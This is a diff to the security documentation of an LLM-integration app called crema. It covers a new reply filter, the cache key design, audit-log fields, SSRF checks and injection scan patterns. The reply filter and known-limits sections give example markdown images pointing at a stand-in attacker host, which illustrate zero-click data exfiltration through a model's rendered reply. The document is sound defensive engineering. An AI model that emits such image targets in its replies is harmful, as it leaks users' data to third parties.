@@ -34,8 +34,11 @@ one vault.
 
 Order carries meaning. The Reply Check must run last: its token is the last thing
 added to the outgoing request, and it must come off the reply before masking puts
-the real values back. The shipped default keeps the Reply Check after both Hide
-rows.
+the real values back. The Reply Filter is the mirror case: it must sit near the top
+of the list, so its own reply-side check runs last of all (reverse row order) and
+sees the final, fully restored reply — not an intermediate form still carrying a
+mask token or a nonce. The shipped default is Text Scan, Reply Filter, Hide Personal
+Information, Hide Health Information, Reply Check.
 
 Each row has an **Action** and a **Use Cases** filter:
 
@@ -153,6 +156,27 @@ case, it never passes one through.
 The scan is the **Text Scan** row on the Guardrails page. It is on (`Block`) for
 every use case by default. `Log Only` records a hit on the log row instead of
 blocking; use it to measure false positives on a use case before you decide.
+
+## The reply filter — Reply Filter
+
+The reply filter removes remote targets from a markdown or HTML reply, so an
+embedding app that renders the reply cannot be made to call another server on
+render — a zero-click exfiltration channel through an image, for example
+`![](https://attacker.example/?d=secret)`. It rewrites every remote markdown
+image and link target, and every remote HTML `src`/`href`, to `#`. A target
+relative to the site (`/files/x.png`) passes through unchanged.
+
+It is a text pass, not a full markdown or HTML parser: a markdown *reference*
+definition, or an HTML attribute other than `src`/`href`, is not covered. It fails
+open on a miss — the target stays rather than the reply being corrupted — the same
+trade-off the scan makes in the other direction. Audio has no reply text, so this
+check has nothing to reach in `transcribe()`.
+
+The filter is the **Reply Filter** row on the Guardrails page, `Off` by default —
+an app that renders a reply as plain text or already escapes it before rendering
+needs no filtering. `Log Only` records a removal count on the log row and returns
+the cleaned reply; `Block` also fails the call with a `Blocked` log row, since a
+reply that tried to carry a remote target is itself the signal worth stopping on.
 
 ## Guarding against malicious intent
 
@@ -306,6 +330,47 @@ The switch to the isolation user and back restores the calling browser session
 exactly — the session identity, its cache entry, and the request's form data — not
 just the calling user's name.
 
+### The answer cache
+
+A cached reply is keyed by a SHA-256 hash of the request: the interface the caller
+asked for, the interface that served it after the fallback walk, the isolation
+user, the model, the system prompt, the prompt, the context, the response format,
+and the history. It is not keyed by the session user — two users who make the
+identical request are served the identical reply.
+
+That is deliberate, and it is safe for one reason: no part of a crema request is
+assembled under the *calling* user's permissions. Every document read, every file
+read, and every masking term harvest happens inside the interface's isolation
+sandbox — `transform()` checks the document's read permission as the isolation
+user, `extract()` checks the create permission as the isolation user, a file
+passed to `ask()` is resolved as the isolation user, and an automation run happens
+entirely inside it. The only caller-supplied input is the `context` string, which
+the caller already holds. An identical request therefore implies identical
+readable inputs, whoever asks. The isolation user is part of the key, so two
+interfaces with different sandboxes never share an entry.
+
+If crema ever grows a read path fenced by the calling user rather than by an
+isolation user, this key must gain the calling user with it.
+
+The requested interface is part of the key for a second reason: a guardrail row is
+matched against the use case the caller asked for, not the one a fallback resolved
+to. Without it, two use cases that fall back to the same provider and share a
+system prompt would share one entry, and a reply produced under a permissive
+guardrail posture could be served to a strict one.
+
+The cache is bounded only by the interface's `cache_ttl`. A configuration change is
+not an invalidation event: repointing an interface at a different provider, or
+changing what its isolation user can read, does not drop entries already stored —
+the earlier reply can still be served until its TTL expires. Set `cache_ttl` to the
+staleness you are willing to accept.
+
+A cache hit does not check the budget — it spends nothing, so a user over their
+monthly ceiling is still served a reply that was already paid for. The hit is
+logged as its own `Cached` row against that user either way.
+
+A call carrying `files` is never cached, in either direction: the key cannot see
+the file bytes, and a File URL's content can change while the URL does not.
+
 ## The audit log
 
 Every call that reaches the provider writes one row to the Crema Log. A cached hit
@@ -316,10 +381,12 @@ alone. An OCR call that escalates to `advanced_ocr` still writes one row, but it
 | Field | Notes |
 |---|---|
 | `interface` | |
-| `model` | |
+| `model` | The configured model name. |
+| `served_model` | The model id the provider's own response reported it ran — not always the same string as `model` (a provider alias, or a silent version bump on their side). Blank on a row written before this field existed, or where the response carried none. On a row billing more than one provider call (`llm_calls > 1`), this is the last call's served model — the one behind the answer actually returned. |
+| `app_version` | The crema app version that produced this row, so an incident can be replayed against the exact stack that made the call. Blank on a row written before this field existed. |
 | `user` | The session user. On a row an automation task writes, this is the interface's isolation user — the whole run happens inside the sandbox. |
 | `status` | `Success`, `Cached`, `Blocked`, or `Error`. |
-| `prompt_sha` | A SHA-256 fingerprint of the full request: interface, model, prompts, context, history, and response format. On an OCR or transcription row: a hash of the file bytes. For correlation only — two identical requests carry the same hash. |
+| `prompt_sha` | A SHA-256 fingerprint of the full request: the requested and serving interfaces, the isolation user, the model, the prompts, the context, the history, and the response format. On an OCR or transcription row: a hash of the file bytes. For correlation only — two identical requests carry the same hash. It is also the response-cache key (see "The answer cache" above): two rows sharing a `prompt_sha` are two calls that would have shared a cache entry. |
 | `chain_seq` | This row's position in the tamper-evidence chain. See "A tamper-evident chain" below. Blank on a row written before this field existed. |
 | `chain_sha` | A SHA-256 of this row's own audit fields plus the row before it's `chain_sha`. Blank on a row written before this field existed. |
 | `duration_ms` | |
@@ -331,10 +398,10 @@ alone. An OCR call that escalates to `advanced_ocr` still writes one row, but it
 No field of the log stores the prompt text, the context text, or document content.
 
 On the Crema Log form, `interface_label`, `user`, `status`, `detail`, `total_tokens`, and
-`cost_usd` are always visible. `interface`, `model`, `provider`, `prompt_sha`,
-`chain_seq`, `chain_sha`, `duration_ms`, `llm_calls`, `prompt_tokens`, and
-`completion_tokens` are in a **Details** section. Grouping the fields does not change
-what is stored.
+`cost_usd` are always visible. `interface`, `model`, `served_model`, `app_version`,
+`provider`, `prompt_sha`, `chain_seq`, `chain_sha`, `duration_ms`, `llm_calls`,
+`prompt_tokens`, and `completion_tokens` are in a **Details** section. Grouping the
+fields does not change what is stored.
 
 ### A tamper-evident chain
 
@@ -448,6 +515,26 @@ still readable everywhere Crema reads records today (a Document Query source, th
 desk assistant's "view" action), since reading was never the concern this list
 answers.
 
+## Background execution
+
+`extract` can make up to three provider calls (OCR, its `advanced_ocr` escalation,
+then the mapping call) and hold a web worker for minutes on a slow provider — long
+enough to starve a small bench for every user on it, not only the one waiting.
+`crema.api.extract_async` queues that read instead of running it inline, and delivers
+the result later as a `frappe.realtime` event (see [use.md](use.md#http-endpoints)).
+That event carries whatever `extract` found — document content — so **every publish
+of it is scoped to one user, never a bare site-wide broadcast**: `run_extract`, the
+job `extract_async` queues, always calls `frappe.publish_realtime(..., user=user)`
+with `user` set to `frappe.session.user` as `frappe.enqueue`'s own `execute_job`
+resolved it — the same identity `extract_async` gated in the request that queued the
+job. Frappe's own default (no `user`/`room`/`doctype` given to `publish_realtime`) is
+the *whole site*, not the caller — omitting `user` here would broadcast one user's
+document content to every desk session on the bench. Every rate limit and role gate
+that guards the inline `extract_api` gates `extract_async` too, applied in the web
+request before the job is queued: `_check_user_rate_limit` reads
+`frappe.local.request`, which is unset inside a worker, so checking it there instead
+would let a queued call skip the per-user budget entirely.
+
 ## Kill switch
 
 Two flags, either one stops every LLM call:
@@ -525,10 +612,21 @@ known vulnerability inside that range, the pin flags the range itself.
 
 ## Known limits
 
-- `automation._fetch` follows HTTP redirects and applies no private-IP or loopback
-  block. This is an accepted risk today, because only a System Manager can set
-  `source_url`. The **Dry Run** button also reaches it, from a web request rather
-  than only from the scheduler. See [Planned hardening](#planned-hardening) below.
+- `api.trigger_automation` is replay-protected only while its task carries a **Webhook
+  Secret** — a `timestamp`/`signature` HMAC, checked against a freshness window and a
+  single-use nonce cache. A task with no secret set is fenced by Frappe token auth
+  alone, exactly as before this existed: a captured request can be replayed by anyone
+  who can still present that token. Setting a secret is a task-owner choice, not a
+  default.
+- `automation._fetch` resolves the host of every URL it fetches — the start URL and
+  every redirect hop — and refuses one that resolves to a private, loopback, or
+  link-local address (so a cloud metadata endpoint is refused the same as `127.0.0.1`).
+  A host that fails to resolve at all is let through; `requests` then fails on it a
+  moment later. The residual gap is DNS rebinding: the check resolves the host once,
+  `requests` resolves it again a moment later, and a DNS answer that changes between
+  the two is not caught. Accepted today because only a System Manager can set
+  `source_url` in the first place; the **Dry Run** button still reaches this path from
+  a web request rather than only from the scheduler.
 - A File Query source lists `File` rows under the account in **Runs As** — the task's
   own if it has one, otherwise the AI profile's. Frappe's own File permission rule
   narrows that listing to `owner = <account>` for any account that is not a "System
@@ -578,43 +676,20 @@ known vulnerability inside that range, the pin flags the range itself.
   escaping closes: a reply carrying `![](https://attacker/?d=...)` makes the browser
   send data to a third party on render, with no click. The scan does not block
   markdown images on the way in, because legitimate documents carry them (see
-  `security.py`'s own note). An embedding app must strip or allow-list image and link
-  targets before it renders a reply — the output-side content filter hook under
-  [Planned hardening](#planned-hardening) is the future home for that.
+  `security.py`'s own note). The **Reply Filter** row (see
+  [The reply filter](#the-reply-filter--reply-filter) above) closes this for an app
+  that switches it on; it is `Off` by default, so an embedding app that does not turn
+  it on is still exposed. `transcribe()` has no reply text for it to reach either way.
+- Audio transcripts (`client._transcribe`, `transcribe()`) never pass through the
+  guardrails onion at all — there is no system prompt to protect, so neither the trap
+  nor the Reply Filter runs against a transcript. Only a Hide row set to `Block`
+  reaches this path, and only to refuse the call outright (see above).
 
 ## Planned hardening
 
 Work not yet done, kept here rather than in PLAN.md because each item is a gap in a
 guarantee this page already states.
 
-- **SSRF egress control for `automation._fetch`.** A deny-list for private and
-  loopback addresses (or an allow-listed egress proxy), closing the redirect-following
-  gap the Known limits section above describes.
-- **Per-app scan patterns.** An installed app can register a new interface through
-  `crema_interfaces`, but has no way to add its own injection patterns to the scan —
-  `security.scan` has to stay free of any Frappe import, so this has to be a
-  caller-side merge one level up (the same shape `_scan_context` already uses for
-  `history`), not a hooks lookup inside `scan()` itself.
-- **An output-side content filter hook.** `log.redact` only scrubs a provider's own
-  API key out of error text — never the model's reply. A consuming app that needs a
-  PII or secret-term filter on every response runs its own regex layer today; Crema
-  has no equivalent hook.
-- **A user-scoped response cache.** The response cache is addressed by content hash
-  alone — interface, model, system prompt, prompt, context, and history, but no user
-  and no permission state. A reply cached for one user is served to any other user
-  who produces the identical resolved prompt. Context assembly runs under the
-  interface's isolation user, so an identical prompt implies identical readable
-  inputs — but that argument holds only while it is written down and tested, and it
-  says nothing about the second, smaller gap: the hash carries the *resolved*
-  interface name, so two requested interfaces that fall back to the same provider and
-  share a system prompt collide into one cache entry. The fix shape: add the session
-  user (or a hash of the user's effective permissions) and the requested interface
-  name to the cache key, or record precisely why each omission is safe.
-- **Version stamping in audit rows.** A log row records the *configured* model id,
-  never the model the provider actually served (`response.model` is read nowhere), and
-  no crema app version. A silent provider-side model bump changes behaviour with no
-  trail, and an incident cannot be replayed against the exact stack that produced it.
-  Record both, and add the new fields to the log's tamper-evident `CHAIN_FIELDS`.
 - **The scan's scope is frozen.** Text Scan stays exactly what it is today: a
   deterministic, offline, fail-closed pre-filter — the invisible/bidi/control
   character block, the long-base64 block, the four-step canonicalisation, and the
@@ -635,9 +710,18 @@ guarantee this page already states.
 
 ## Add a new scan pattern
 
+**Built into crema:**
+
 1. Open `crema/security.py`.
 2. Append a `(compiled_regex, reason)` tuple to `_INJECTION_PATTERNS`. Use the flags
    `re.I | re.S` — a line break inside a pattern's gap can defeat a pattern that
    lacks `re.S`. Patterns match the canonical text, so write them in plain lowercase
    ASCII: not a fullwidth spelling, and not a spelling with look-alike letters.
 3. Add a matching case to the `CASES` table in `crema/test_security.py`.
+
+**From an installed app, with no crema edit:** add a `crema_scan_patterns` dict to
+that app's `hooks.py` — see [configure.md — Add your own scan
+patterns](configure.md#add-your-own-scan-patterns). `crema.guardrails.scan_patterns`
+reads it, compiles each entry with the same `re.I | re.S`, and passes the whole set
+into `security.scan` as `extra`, so an app pattern gets the same canonicalisation as
+a built-in one, with no Frappe import inside `security.py` itself.
